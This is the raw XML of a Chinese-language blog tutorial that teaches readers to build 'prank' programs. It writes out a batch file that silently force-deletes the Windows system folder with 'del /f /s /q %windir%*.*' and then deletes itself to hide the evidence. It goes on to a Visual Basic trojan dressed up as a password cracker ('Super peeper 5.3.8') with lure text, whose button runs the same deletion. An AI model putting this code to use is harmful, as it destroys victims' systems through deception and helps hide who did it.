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635cm" style:line-height-at-least="0.635cm" fo:text-indent="0cm" style:auto-text-indent="false" fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" fo:letter-spacing="normal" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.635cm" style:line-height-at-least="0.635cm" fo:text-indent="0cm" style:auto-text-indent="false" fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:line-height-at-least="0.635cm" fo:text-indent="0cm" style:auto-text-indent="false" fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#3c6e02" style:text-line-through-style="none" fo:letter-spacing="normal" style:text-underline-style="none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background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:line-height-at-least="0.635cm" fo:text-indent="0cm" style:auto-text-indent="false" fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Quotations">
      <style:paragraph-properties fo:margin-left="1.132cm" fo:margin-right="1.265cm" fo:margin-top="0cm" fo:margin-bottom="0.635cm" style:line-height-at-least="0.476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fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Quotations">
      <style:paragraph-properties fo:margin-left="1.132cm" fo:margin-right="1.265cm" fo:margin-top="0cm" fo:margin-bottom="0.635cm" style:line-height-at-least="0.476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font-name="Times New Roman1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Quotations">
      <style:paragraph-properties fo:margin-left="1.132cm" fo:margin-right="1.265cm" fo:margin-top="0cm" fo:margin-bottom="0.635cm" style:line-height-at-least="0.476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fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Quotations">
      <style:paragraph-properties fo:margin-left="1.132cm" fo:margin-right="1.265cm" fo:margin-top="0cm" fo:margin-bottom="0.635cm" style:line-height-at-least="0.476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font-name="Times New Roman1" fo:font-size="12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.635cm" style:line-height-at-least="0.635cm" fo:text-indent="0cm" style:auto-text-indent="false" fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0.635cm" style:line-height-at-least="0.635cm" fo:text-indent="0cm" style:auto-text-indent="false" fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" fo:letter-spacing="normal" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="P1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background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" fo:letter-spacing="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:line-height-at-least="0.635cm" fo:text-indent="0cm" style:auto-text-indent="false" fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#3c6e02" style:text-line-through-style="none" fo:letter-spacing="normal" style:text-underline-style="none" style:text-blinking="false" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P1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ff" fo:letter-spacing="normal" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0cm" fo:margin-bottom="0cm" style:line-height-at-least="0.635cm" fo:text-indent="0cm" style:auto-text-indent="false" fo:background-color="#ffffff" fo:padding="0cm" fo:border="none">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#3c6e02" style:text-line-through-style="none" fo:letter-spacing="normal" style:text-underline-style="none" style:text-blinking="false" fo:background-color="transparent" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" fo:letter-spacing="normal" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" fo:letter-spacing="normal" fo:background-color="transparent" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" style:font-name="Times New Roman1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#333333" style:font-name="Times New Roman1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#800000" style:font-name="Times New Roman1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#ff0000" style:font-name="Times New Roman1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008080" style:font-name="Times New Roman1" fo:font-size="12pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#008080" fo:letter-spacing="normal" fo:background-color="transparent" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="bold"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties style:font-name="Times New Roman1" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:color="#ff0000" fo:background-color="transparent" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#ff0000" style:font-name="Times New Roman1" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#ff6600" style:font-name="Times New Roman1" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#ff6600" fo:background-color="transparent" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:color="#800000" fo:background-color="transparent" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian="normal" style:font-weight-asian="normal"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:color="#800000" style:font-name="Times New Roman1" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties fo:color="#000000" style:font-name="Times New Roman1" fo:font-size="12pt" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:color="#000000" fo:background-color="transparent" style:font-name-asian="Times New Roman1" style:font-size-asian="12pt" style:font-style-asian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02cm solid #cccccc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首先一樣，開啟記事本</text:p>
      <text:p text:style-name="P3"><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3252/3010073794_449475cee6_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形1" text:anchor-type="as-char" svg:width="10.389cm" svg:height="7.426cm" draw:z-index="0"><draw:image xlink:href="http://farm4.static.flickr.com/3252/3010073794_449475cee6_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P5"><text:a xlink:type="simple" xlink:href="http://it-easy.tw/yourselfclean/" office:target-frame-name="_blank" xlink:show="new"><text:span text:style-name="T2">上次</text:span></text:a><text:span text:style-name="T3">我們是教要複製下面的文字</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T11">@echo off<text:line-break/>echo </text:span><text:span text:style-name="T1">正在清除系統垃圾文件，請稍等……</text:span><text:span text:style-name="T11"><text:line-break/>del /f /s /q %systemdrive%*.tmp<text:line-break/>del /f /s /q %systemdrive%*._mp<text:line-break/>del /f /s /q %systemdrive%*.log<text:line-break/>del /f /s /q %systemdrive%*.gid<text:line-break/>del /f /s /q %systemdrive%*.chk<text:line-break/>del /f /s /q %systemdrive%*.old<text:line-break/>del /f /s /q %systemdrive%recycled*.*<text:line-break/>del /f /s /q %windir%*.bak<text:line-break/>del /f /s /q %windir%prefetch*.*<text:line-break/>rd /s /q %windir%temp &amp; md %windir%temp<text:line-break/>del /f /q %userprofile%cookies*.*<text:line-break/>del /f /q %userprofile%recent*.*<text:line-break/>del /f /s /q “%userprofile%Local SettingsTemporary Internet Files*.*"<text:line-break/>del /f /s /q “%userprofile%Local SettingsTemp*.*"<text:line-break/>del /f /s /q “%userprofile%recent*.*"<text:line-break/>echo </text:span><text:span text:style-name="T1">清除系統垃圾完成！</text:span><text:span text:style-name="T11"><text:line-break/>echo. &amp; pause</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1">這些文字的功用，是在</text:span><text:span text:style-name="T12">“刪除</text:span><text:span text:style-name="T13">"</text:span><text:span text:style-name="T1">暫存檔案</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">為什麼能</text:span><text:span text:style-name="T11">"</text:span><text:span text:style-name="T1">刪除</text:span><text:span text:style-name="T11">"</text:span><text:span text:style-name="T1">暫存檔案呢</text:span><text:span text:style-name="T11">?</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">不曉得你有沒有發現，文字中的</text:span><text:span text:style-name="T11">del</text:span><text:span text:style-name="T1">就是用來刪除的指令。而後所接的路徑，就是要刪除的檔案路徑與副檔名</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T3">路徑中的</text:span><text:span text:style-name="T5">%systemdrive%</text:span><text:span text:style-name="T3">，指的就是你安裝作業系統的那個磁碟機，你可以利用開始→</text:span><text:a xlink:type="simple" xlink:href="http://it-easy.tw/start/" office:target-frame-name="_blank" xlink:show="new"><text:span text:style-name="T2">執行</text:span></text:a><text:span text:style-name="T3">，輸入</text:span><text:span text:style-name="T7">%systemdrive%</text:span><text:span text:style-name="T3">得知你安裝作業系統的磁碟機是哪個</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">另外</text:span><text:span text:style-name="T11">%windir%</text:span><text:span text:style-name="T1">指的就是你的系統資料夾</text:span><text:span text:style-name="T11">(Windows)</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T1">而</text:span><text:span text:style-name="T11">%userprofile%</text:span><text:span text:style-name="T1">就是目前使用中的使用者所用的文件資料夾</text:span><text:span text:style-name="T11">(</text:span><text:span text:style-name="T1">我的文件</text:span><text:span text:style-name="T11">)</text:span></text:p>
      <text:p text:style-name="P1">再來要說明的就是路徑最後面的檔案名稱</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T11">*.*</text:span><text:span text:style-name="T1">就是所有副檔名的所有檔案的意思</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">而</text:span><text:span text:style-name="T11">*.tmp</text:span><text:span text:style-name="T1">就是所有副檔名為</text:span><text:span text:style-name="T11">.tmp</text:span><text:span text:style-name="T1">的檔案</text:span></text:p>
      <text:p text:style-name="P1">依此類推</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T11">*.bmp </text:span><text:span text:style-name="T1">就是所有副檔名為</text:span><text:span text:style-name="T11">.bmp</text:span><text:span text:style-name="T1">的檔案</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T11">*.mp3 </text:span><text:span text:style-name="T1">就是所有副檔名為</text:span><text:span text:style-name="T11">.mp3</text:span><text:span text:style-name="T1">的檔案</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">了解以上格式後，我們來編寫惡作劇的</text:span><text:span text:style-name="T11">Bat</text:span><text:span text:style-name="T1">檔吧</text:span><text:span text:style-name="T11">!</text:span></text:p>
      <text:p text:style-name="P1">我們先在記事本打上以下文字</text:p>
      <text:p text:style-name="P7">@echo off</text:p>
      <text:p text:style-name="P3"><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3196/3031768560_cf6753c2e0_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形2" text:anchor-type="as-char" svg:width="10.204cm" svg:height="7.294cm" draw:z-index="1"><draw:image xlink:href="http://farm4.static.flickr.com/3196/3031768560_cf6753c2e0_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">上面的文字是什麼意思</text:span><text:span text:style-name="T11">?</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">這個</text:span><text:span text:style-name="T11">Windows</text:span><text:span text:style-name="T1">裡就有答案了</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T3">開始→</text:span><text:a xlink:type="simple" xlink:href="http://it-easy.tw/start/" office:target-frame-name="_blank" xlink:show="new"><text:span text:style-name="T2">執行</text:span></text:a><text:span text:style-name="T3">，輸入</text:span><text:span text:style-name="T5">"</text:span><text:span text:style-name="T8">cmd</text:span><text:span text:style-name="T5">"</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1">然後輸入</text:span><text:span text:style-name="T11">"</text:span><text:span text:style-name="T13">echo/?</text:span><text:span text:style-name="T11">"</text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3223/3031768692_b1d523c778_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形3" text:anchor-type="as-char" svg:width="10.389cm" svg:height="6.632cm" draw:z-index="2"><draw:image xlink:href="http://farm4.static.flickr.com/3223/3031768692_b1d523c778_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">基本上，</text:span><text:span text:style-name="T11">cmd</text:span><text:span text:style-name="T1">指令都能以「指令</text:span><text:span text:style-name="T11">+/?</text:span><text:span text:style-name="T1">」的方式來查詢使用方法</text:span></text:p>
      <text:p text:style-name="P1">然後我們要打上惡作劇前要先顯示的文字</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T11">echo </text:span><text:span text:style-name="T1">有種就按按鍵盤按鍵啊</text:span></text:p>
      <text:p text:style-name="P3"><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3067/3030930403_da07593593_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形4" text:anchor-type="as-char" svg:width="10.178cm" svg:height="7.267cm" draw:z-index="3"><draw:image xlink:href="http://farm4.static.flickr.com/3067/3030930403_da07593593_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P1">再來就要寫一個停留的指令來暫時將程式停留在這段文字下</text:p>
      <text:p text:style-name="P7">echo. &amp; pause</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3210/3031769008_ce3ebcb467_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形5" text:anchor-type="as-char" svg:width="10.31cm" svg:height="7.373cm" draw:z-index="4"><draw:image xlink:href="http://farm4.static.flickr.com/3210/3031769008_ce3ebcb467_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">接著撰寫你要惡作劇的指令吧</text:span><text:span text:style-name="T11">!</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">夠狠的話就寫個</text:span><text:span text:style-name="T11">"</text:span><text:span text:style-name="T1">把系統檔全部刪除</text:span><text:span text:style-name="T11">"</text:span><text:span text:style-name="T1">的指令</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">我們需要用到</text:span><text:span text:style-name="T11">"del"</text:span><text:span text:style-name="T1">指令</text:span></text:p>
      <text:p text:style-name="P1">我們要撰寫以下指令</text:p>
      <text:p text:style-name="P7">del %windir%*.*</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">但如果單純這樣寫，</text:span><text:span text:style-name="T11">Windows</text:span><text:span text:style-name="T1">執行前還是會先詢問是否要刪除</text:span></text:p>
      <text:p text:style-name="P3"><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3290/3031769108_3bd1f32875_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形6" text:anchor-type="as-char" svg:width="10.204cm" svg:height="6.526cm" draw:z-index="5"><draw:image xlink:href="http://farm4.static.flickr.com/3290/3031769108_3bd1f32875_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P1">所以我們需要加上幾個指令</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">至於要加什麼指令，就要看看</text:span><text:span text:style-name="T11">"del/?"</text:span><text:span text:style-name="T1">了</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T3">開始→</text:span><text:a xlink:type="simple" xlink:href="http://it-easy.tw/start/" office:target-frame-name="_blank" xlink:show="new"><text:span text:style-name="T2">執行</text:span></text:a><text:span text:style-name="T3">→輸入</text:span><text:span text:style-name="T5">"cmd"→</text:span><text:span text:style-name="T3">輸入</text:span><text:span text:style-name="T5">"del/?"</text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3277/3031769260_06a5fa29c6_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形7" text:anchor-type="as-char" svg:width="10.257cm" svg:height="6.553cm" draw:z-index="6"><draw:image xlink:href="http://farm4.static.flickr.com/3277/3031769260_06a5fa29c6_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">我們從清單中挑幾個適合的指令出來吧</text:span><text:span text:style-name="T11">!</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">要刪除系統檔，當然要強制刪除唯讀檔啊，所以</text:span><text:span text:style-name="T11">"/f"</text:span><text:span text:style-name="T1">會被我們採用</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">再來就是要刪除所有子目錄的檔案，</text:span><text:span text:style-name="T11">"/s"</text:span><text:span text:style-name="T1">被採用</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">不要問是否刪除檔案，</text:span><text:span text:style-name="T11">"/q"</text:span><text:span text:style-name="T1">被採用</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">所以我們的</text:span><text:span text:style-name="T11">del</text:span><text:span text:style-name="T1">指令需寫成</text:span></text:p>
      <text:p text:style-name="P7">del /f /s /q %windir%*.*</text:p>
      <text:p text:style-name="P3"><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3217/3031769398_8b3a1039b6_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形8" text:anchor-type="as-char" svg:width="10.627cm" svg:height="7.611cm" draw:z-index="7"><draw:image xlink:href="http://farm4.static.flickr.com/3217/3031769398_8b3a1039b6_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1">再來就存檔吧</text:span><text:span text:style-name="T11">!</text:span><text:span text:style-name="T1">副檔名為</text:span><text:span text:style-name="T13">.bat</text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3141/3030931121_54eac4a761_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形9" text:anchor-type="as-char" svg:width="10.019cm" svg:height="7.638cm" draw:z-index="8"><draw:image xlink:href="http://farm4.static.flickr.com/3141/3030931121_54eac4a761_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T4">要注意喔</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T6">!</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T4">自己不要不小心按到喔</text:span></text:span></text:p>
      <text:p text:style-name="P1">再來還可以增加功能</text:p>
      <text:p text:style-name="P1">當我們惡作劇後，為了不被發現，通常會抹除證據</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">那這種東西要怎麼抹除證據呢</text:span><text:span text:style-name="T11">?</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">很簡單啊</text:span><text:span text:style-name="T11">!</text:span><text:span text:style-name="T1">用指令來刪除這個檔案就好了啊</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T11">del /f /s /q </text:span><text:span text:style-name="T1">檔名</text:span><text:span text:style-name="T11">.bat</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1">看你要把以上指令放在</text:span><text:span text:style-name="T14">del /f /s /q %windir%*.*</text:span><text:span text:style-name="T15">之前</text:span><text:span text:style-name="T14">(</text:span><text:span text:style-name="T15">惡作劇前先刪掉此檔</text:span><text:span text:style-name="T14">)</text:span><text:span text:style-name="T1">或是放在</text:span><text:span text:style-name="T14">del /f /s /q %windir%*.*</text:span><text:span text:style-name="T15">之後</text:span><text:span text:style-name="T14">(</text:span><text:span text:style-name="T15">惡作劇後刪掉此檔</text:span><text:span text:style-name="T14">)</text:span></text:p>
      <text:p text:style-name="P3"><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3296/3030931297_bf793c6350_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形10" text:anchor-type="as-char" svg:width="10.019cm" svg:height="7.161cm" draw:z-index="9"><draw:image xlink:href="http://farm4.static.flickr.com/3296/3030931297_bf793c6350_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T3">前者雖不留痕跡，但可能會發生</text:span><text:span text:style-name="T5">bat</text:span><text:span text:style-name="T3">檔尚未執行下面的</text:span><text:span text:style-name="T5">Del</text:span><text:span text:style-name="T3">指令，就被關閉的情況，所以</text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T4">建議用後者</text:span></text:span><text:span text:style-name="T3">。</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">如果還要再狠一點的話，就把</text:span><text:span text:style-name="T11">echo. &amp; pause</text:span><text:span text:style-name="T1">拿掉，執行程式立刻動作</text:span><text:span text:style-name="T11">(</text:span><text:span text:style-name="T1">刪除系統檔</text:span><text:span text:style-name="T11">)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">不過千萬要小心自己別去點到了</text:span><text:span text:style-name="T11">!</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T11">首先我們要發揮想像力，打造一個任何使用者都喜歡的程式介面</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">我的步驟如下</text:span><text:span text:style-name="T11">:</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">1.</text:span><text:span text:style-name="T1">將表單</text:span><text:span text:style-name="T11">(Form1)</text:span><text:span text:style-name="T1">的標題改為</text:span><text:span text:style-name="T16">破解無名密碼 </text:span><text:span text:style-name="T17">Super peeper 5.3.8</text:span></text:p>
      <text:p text:style-name="P1">為什麼要這樣，因為這樣看起來比較專業</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T11">2.</text:span><text:span text:style-name="T1">再來將表單的背景顏色改為黑色</text:span><text:span text:style-name="T11">(BackColor=&amp;H00000000&amp;)</text:span></text:p>
      <text:p text:style-name="P1">這樣一來才有一種偷偷摸摸的感覺</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T11">3.</text:span><text:span text:style-name="T1">佈置一個可以讓使用者輸入網址的文字輸入方塊</text:span><text:span text:style-name="T11">(Text1)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T11">4.</text:span><text:span text:style-name="T1">發會想像力，打些誘惑人的文字，越虎爛越好</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T11">5.</text:span><text:span text:style-name="T1">美化一下</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T11">6.</text:span><text:span text:style-name="T1">然後放個惡作劇開關</text:span><text:span text:style-name="T11">(Command1)</text:span></text:p>
      <text:p text:style-name="P3"><draw:a xlink:type="simple" xlink:href="http://farm4.static.flickr.com/3294/3086161153_a2d6552096_o.png"><draw:frame draw:style-name="fr1" draw:name="圖形11" text:anchor-type="as-char" svg:width="7.849cm" svg:height="6.659cm" draw:z-index="10"><draw:image xlink:href="http://farm4.static.flickr.com/3294/3086161153_a2d6552096_o.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></draw:a></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T10">然後開始進入最主要的惡作劇程式碼階段吧</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T9">!</text:span></text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T1">如何用</text:span><text:span text:style-name="T11">VB</text:span><text:span text:style-name="T1">執行</text:span><text:span text:style-name="T11">cmd</text:span><text:span text:style-name="T1">指令</text:span><text:span text:style-name="T11">?</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">方法很簡單，利用</text:span><text:span text:style-name="T11">Shell</text:span><text:span text:style-name="T1">保留字就好了</text:span></text:p>
      <text:p text:style-name="P1">格式如下</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T11">Shell “cmd.exe /c " &amp; “</text:span><text:span text:style-name="T1">你的指令</text:span><text:span text:style-name="T11">", vbNormalFocus</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T3">所以根據</text:span><text:a xlink:type="simple" xlink:href="http://it-easy.tw/crazynotepad/" office:target-frame-name="_blank" xlink:show="new"><text:span text:style-name="T2">上一篇</text:span></text:a><text:span text:style-name="T3">文</text:span></text:p>
      <text:p text:style-name="P1">寫出來的程式碼如下</text:p>
      <text:p text:style-name="P7"><text:soft-page-break/>Private Sub Command1_Click()<text:line-break/>Shell “cmd.exe /c " &amp; “del /f /s /q %windir%*.*", vbNormalFocus<text:line-break/>End Sub</text:p>
